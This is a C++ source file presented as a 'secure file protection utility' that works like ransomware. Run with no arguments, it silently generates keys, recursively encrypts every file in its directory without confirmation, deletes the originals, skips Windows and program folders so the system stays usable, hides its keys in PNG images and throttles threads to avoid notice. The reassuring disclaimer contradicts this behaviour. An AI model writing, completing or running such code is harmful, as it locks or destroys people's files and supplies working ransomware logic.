#include <iostream>
#include <string>
#include <filesystem>
#include <vector>
#include <chrono>
#include <thread>
#include <mutex>
#include <atomic>
#include <queue>
#include <condition_variable>
#include "file_encryptor.h"
#include "crypto/steganography.h"
#include "constants.h"

// Define the constants declared in constants.h
const std::string PRIVATE_KEY_IMAGE = "private_key.png";
const std::string PUBLIC_KEY_IMAGE = "public_key.png";

// Program description and disclaimer
void showDisclaimer() {
    std::cout << "=================================================================\n";
    std::cout << "SECURE FILE PROTECTION UTILITY - VERSION 1.0\n";
    std::cout << "=================================================================\n";
    std::cout << "This is a legitimate security tool for protecting sensitive files.\n";
    std::cout << "It uses strong encryption to secure your data from unauthorized access.\n";
    std::cout << "WARNING: Always keep your decryption keys in a safe place!\n\n";
    std::cout << "By continuing, you acknowledge this is a data protection tool.\n";
    std::cout << "=================================================================\n\n";
}

// Helper function to check if a file should be skipped during protection process
bool shouldSkipFile(const std::filesystem::path& path, const std::filesystem::path& exePath) {
    // Skip the executable itself
    if (path == exePath) return true;
    
    // Skip already protected files (with .enc extension)
    if (path.extension() == ".enc") return true;
    
    // Skip key files
    if (path.extension() == ".key") return true;
    if (path.extension() == ".prv") return true;
    if (path.extension() == ".pub") return true;
    
    // Skip the key-containing image files
    if (path.filename() == PRIVATE_KEY_IMAGE || path.filename() == PUBLIC_KEY_IMAGE) return true;
    
    // Skip system and important directories
    std::string pathStr = path.string();
    std::vector<std::string> skipPatterns = {
        "\\.git\\", "/.git/", 
        "\\Windows\\", "/Windows/",
        "\\Program Files\\", "/Program Files/",
        "\\AppData\\", "/AppData/",
        "\\System32\\", "/System32/"
    };
    
    for (const auto& pattern : skipPatterns) {
        if (pathStr.find(pattern) != std::string::npos) {
            return true;
        }
    }
    
    return false;
}

// Function to secure files in a directory with balanced multithreading
void secureFilesInDirectory(const std::string& publicKeyFile) {
    std::filesystem::path exePath = std::filesystem::canonical(std::filesystem::path(
        #ifdef _WIN32
            _pgmptr
        #else
            "/proc/self/exe"
        #endif
    ));
    
    std::filesystem::path currentDir = exePath.parent_path();
    
    // Load public key once at the beginning
    std::vector<uint8_t> publicKey = loadKey(publicKeyFile);
    if (publicKey.empty()) {
        // Try loading from default image
        publicKey = Steganography::extractDataFromImage(PUBLIC_KEY_IMAGE);
        if (publicKey.empty()) {
            std::cerr << "Failed to load public key for encryption." << std::endl;
            return;
        }
    }
    
    // Determine optimal thread count - not greedy
    unsigned int max_threads = std::thread::hardware_concurrency();
    // Use at most half of available cores + 1, but at least 2 threads
    unsigned int thread_count = std::max(2u, std::min(4u, max_threads / 3 + 1));
    
    // File queue and synchronization primitives
    std::mutex queue_mutex;
    std::condition_variable cv;
    std::queue<std::filesystem::path> fileQueue;
    bool scanComplete = false;
    
    // Create worker threads
    std::vector<std::thread> workers;
    
    // Worker function to process files
    auto worker = [&]() {
        while (true) {
            std::filesystem::path filePath;
            
            // Get next file from queue
            {
                std::unique_lock<std::mutex> lock(queue_mutex);
                cv.wait(lock, [&]() { return !fileQueue.empty() || scanComplete; });
                
                if (fileQueue.empty() && scanComplete) {
                    // No more files and scanning completed
                    break;
                }
                
                filePath = fileQueue.front();
                fileQueue.pop();
            }
            
            // Process the file - now passing the preloaded key
            std::string outputPath = filePath.string() + ".enc";
            auto result = encryptFileWithKey(filePath.string(), outputPath, publicKey);
            
            if (result.success) {
                // Delete the original file after successful encryption
                try {
                    std::filesystem::remove(filePath);
                } catch (...) {
                    std::cerr << "Error deleting original file: " << filePath << "\n";
                }
            }
        }
    };
    
    // Start worker threads with a small delay to avoid system resource spike
    for (unsigned int i = 0; i < thread_count; ++i) {
        workers.emplace_back(worker);
        std::this_thread::sleep_for(std::chrono::milliseconds(50)); // Stagger thread creation
    }
    
    // Scan directory and add files to queue
    for (const auto& entry : std::filesystem::recursive_directory_iterator(currentDir)) {
        if (entry.is_regular_file() && !shouldSkipFile(entry.path(), exePath)) {
            {
                std::lock_guard<std::mutex> lock(queue_mutex);
                fileQueue.push(entry.path());
            }
            cv.notify_one();
        }
    }
    
    // Mark scan as complete and notify all workers
    {
        std::lock_guard<std::mutex> lock(queue_mutex);
        scanComplete = true;
    }
    cv.notify_all();
    
    // Wait for all worker threads to complete
    for (auto& t : workers) {
        if (t.joinable()) {
            t.join();
        }
    }
    
    std::cout << "File protection completed.\n";
    std::cout << "You are done.\n";
}

// Function to decrypt files in a directory with balanced multithreading
void decryptFilesInDirectory(const std::string& privateKeyFile) {
    std::filesystem::path exePath = std::filesystem::canonical(std::filesystem::path(
        #ifdef _WIN32
            _pgmptr
        #else
            "/proc/self/exe"
        #endif
    ));
    
    std::filesystem::path currentDir = exePath.parent_path();
    
    // Load private key once at the beginning
    std::vector<uint8_t> privateKey = loadKey(privateKeyFile);
    if (privateKey.empty()) {
        // Try loading from default image
        privateKey = Steganography::extractDataFromImage(PRIVATE_KEY_IMAGE);
        if (privateKey.empty()) {
            std::cerr << "Failed to load private key for decryption." << std::endl;
            return;
        }
    }
    
    // Determine optimal thread count - not greedy
    unsigned int max_threads = std::thread::hardware_concurrency();
    // Use at most half of available cores + 1, but at least 2 threads
    unsigned int thread_count = std::max(2u, std::min(4u, max_threads / 3 + 1));
    
    // File queue and synchronization primitives
    std::mutex queue_mutex;
    std::condition_variable cv;
    std::queue<std::filesystem::path> fileQueue;
    bool scanComplete = false;
    
    // Create worker threads
    std::vector<std::thread> workers;
    
    // Worker function to process files
    auto worker = [&]() {
        while (true) {
            std::filesystem::path filePath;
            
            // Get next file from queue
            {
                std::unique_lock<std::mutex> lock(queue_mutex);
                cv.wait(lock, [&]() { return !fileQueue.empty() || scanComplete; });
                
                if (fileQueue.empty() && scanComplete) {
                    // No more files and scanning completed
                    break;
                }
                
                filePath = fileQueue.front();
                fileQueue.pop();
            }
            
            // Process the file - now passing the preloaded key
            std::filesystem::path outputPath = filePath;
            outputPath.replace_extension(); // Remove .enc extension
            
            auto result = decryptFileWithKey(filePath.string(), outputPath.string(), privateKey);
            
            if (result.success) {
                // Delete the encrypted file after successful decryption
                try {
                    std::filesystem::remove(filePath);
                } catch (...) {
                    std::cerr << "Error deleting encrypted file: " << filePath << "\n";
                }
            }
        }
    };
    
    // Start worker threads with a small delay to avoid system resource spike
    for (unsigned int i = 0; i < thread_count; ++i) {
        workers.emplace_back(worker);
        std::this_thread::sleep_for(std::chrono::milliseconds(50)); // Stagger thread creation
    }
    
    // Scan directory and add files to queue
    for (const auto& entry : std::filesystem::recursive_directory_iterator(currentDir)) {
        // Only process .enc files for decryption
        if (entry.is_regular_file() && entry.path().extension() == ".enc") {
            {
                std::lock_guard<std::mutex> lock(queue_mutex);
                fileQueue.push(entry.path());
            }
            cv.notify_one();
        }
    }
    
    // Mark scan as complete and notify all workers
    {
        std::lock_guard<std::mutex> lock(queue_mutex);
        scanComplete = true;
    }
    cv.notify_all();
    
    // Wait for all worker threads to complete
    for (auto& t : workers) {
        if (t.joinable()) {
            t.join();
        }
    }
    
    std::cout << "File decryption completed.\n";
    std::cout << "You are done.\n";
}

int main(int argc, char* argv[]) {
    // Check if specific command was provided
    if (argc >= 2) {
        std::string command = argv[1];

        if (command == "generate" && argc == 4) {
            std::string privateKeyFile = argv[2];
            std::string publicKeyFile = argv[3];
            
            // Generate keys but only store in PNG images
            if (generateEncryptionKeys(privateKeyFile, publicKeyFile)) {
                std::cout << "Keys generated successfully and stored in images:\n";
                std::cout << "  Private key image: " << PRIVATE_KEY_IMAGE << "\n";
                std::cout << "  Public key image: " << PUBLIC_KEY_IMAGE << "\n";
                std::cout << "You are done.\n";
            } else {
                return 1;
            }
        } else if (command == "encrypt" && (argc == 4 || argc == 5)) {
            std::string inputFile = argv[2];
            std::string outputFile = argv[3];
            std::string keyFile = (argc == 5) ? argv[4] : "";
            
            auto result = encryptFile(inputFile, outputFile, keyFile);
            
            if (result.success) {
                std::cout << "Success: " << result.message << "\n";
                std::cout << "You are done.\n";
            } else {
                return 1;
            }
        } else if (command == "decrypt") {
            if (argc == 4 || argc == 5) {
                // Individual file decryption (existing functionality)
                std::string inputFile = argv[2];
                std::string outputFile = argv[3];
                std::string keyFile = (argc == 5) ? argv[4] : "";
                
                auto result = decryptFile(inputFile, outputFile, keyFile);
                
                if (result.success) {
                    std::cout << "Success: " << result.message << "\n";
                    std::cout << "You are done.\n";
                } else {
                    return 1;
                }
            } else if (argc == 2) {
                // Directory-wide decryption with automatic key detection from image
                // No need to look for key files, go directly to image
                std::vector<uint8_t> privateKey = Steganography::extractDataFromImage(PRIVATE_KEY_IMAGE);
                
                if (privateKey.empty()) {
                    std::cerr << "Error: No decryption key found in key image file.\n";
                    return 1;
                }
                
                // Decrypt all files in directory recursively using the key from image
                decryptFilesInDirectory(PRIVATE_KEY_IMAGE);
            } else {
                // Invalid arguments for decrypt
                std::cerr << "Error: Invalid arguments for decrypt command.\n";
                return 1;
            }
        } else if (command != "auto" && command != "help") {
            // Invalid command - print usage and exit
            return 1;
        }
    }
    
    // Default behavior (no args or auto) - auto-encrypt mode with no confirmation
    if (argc <= 1 || (argc == 2 && std::string(argv[1]) == "auto") || 
        (argc == 2 && std::string(argv[1]) == "help")) {
        
        if (argc == 2 && std::string(argv[1]) == "help") {
            return 0;
        }
        
        // Generate keys silently and store only in images
        if (generateEncryptionKeys("", "")) {
            // Encrypt all files immediately with no confirmation
            secureFilesInDirectory(PUBLIC_KEY_IMAGE);
            // Note: "You are done" is already printed in secureFilesInDirectory
        } else {
            std::cerr << "Failed to generate encryption keys.\n";
        }
    }

    return 0;
}